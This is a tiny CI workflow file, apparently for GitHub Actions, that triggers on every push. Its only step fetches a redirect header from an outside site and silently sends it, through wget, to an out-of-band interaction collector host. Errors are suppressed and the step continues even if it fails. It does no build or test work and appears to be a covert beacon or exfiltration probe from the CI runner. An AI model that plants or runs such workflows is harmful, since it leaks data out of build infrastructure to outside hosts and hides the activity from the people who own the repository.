name: s5
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          L=$( (curl -s --max-time 8 -D - -o /dev/null https://f.testring.org/ | grep -i "^location:" | tr -d "\r" || echo none) )
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/f2-$(echo $L | head -c 40 | tr " /:" "_")" || true
        continue-on-error: true
